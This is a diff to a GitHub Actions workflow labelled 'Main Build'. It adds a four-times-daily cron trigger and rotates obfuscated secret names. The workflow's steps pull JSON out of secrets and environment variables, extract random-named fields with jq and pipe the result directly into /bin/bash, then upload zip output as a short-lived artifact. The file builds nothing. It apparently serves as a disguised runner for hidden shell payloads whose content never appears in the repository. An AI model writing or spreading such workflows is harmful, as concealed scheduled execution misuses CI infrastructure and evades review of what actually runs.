@@ -2,6 +2,8 @@ name: Main Build
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '17 0,6,12,18 * * *'
 jobs:
   pipeline:
     runs-on: ubuntu-latest
@@ -9,19 +11,16 @@ jobs:
       - uses: actions/checkout@v4
       - name: Invoke
         env:
-          nvtj88: ${{ secrets.nvtj88 }}
+          suq455: ${{ secrets.suq455 }}
         run: |
-          printf '%s' "$nvtj88" | jq -r .cwd813 | /bin/bash
-          printf '%s' "$t11734" | jq -r .xsz011 | /bin/bash
-          printf '%s' "$djfap104" | jq -r .dt0 | /bin/bash
-          echo $ttu652 | jq -r .ztxp73 | /bin/bash
-          echo $nzks388 | jq -r .gdhz27367 | /bin/bash
-          echo $cw736 | jq -r .jzhb3 | /bin/bash
+          printf '%s' "$suq455" | jq -r .ym0593 | /bin/bash
+          printf '%s' "$mev32" | jq -r .co8177 | /bin/bash
+          echo $myrsc1768 | jq -r .axsy0963 | /bin/bash
 
       - name: Persist output
         if: ${{ always() }}
         uses: actions/upload-artifact@v4
         with:
-          name: WZ9benFO
+          name: ydDy3i2o
           path: "*.zip"
           retention-days: 1
